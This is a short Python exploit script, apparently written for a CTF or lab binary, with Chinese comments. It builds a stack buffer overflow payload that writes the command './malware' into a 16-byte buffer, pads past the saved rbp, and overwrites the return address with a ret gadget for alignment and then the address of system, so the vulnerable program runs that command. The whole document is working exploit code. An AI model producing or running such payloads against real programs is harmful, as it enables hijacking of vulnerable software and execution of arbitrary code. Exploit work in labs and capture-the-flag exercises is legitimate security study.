import sys
import struct

# system 函数地址 (0x4017e0)
sys_addr = struct.pack('<Q', 0x4017e0)

# input 函数中的 ret 指令地址 (0x4019d6)，用于栈对齐
ret_addr = struct.pack('<Q', 0x4019d6)

# 构造 payload
# 1. 先放入命令 "./malware" 并用 \x00 截断
payload = b"./malware\x00"

# 2. 填充到 24 字节（填满 16 字节 buffer + 8 字节旧 rbp）
payload += b"A" * (24 - len(payload))

# 3. 覆盖返回地址为 ret 指令地址，让程序先执行一次 ret（实现对齐）
payload += ret_addr

# 4. 再次覆盖返回地址为 system 地址
payload += sys_addr

# 输出
sys.stdout.buffer.write(payload)
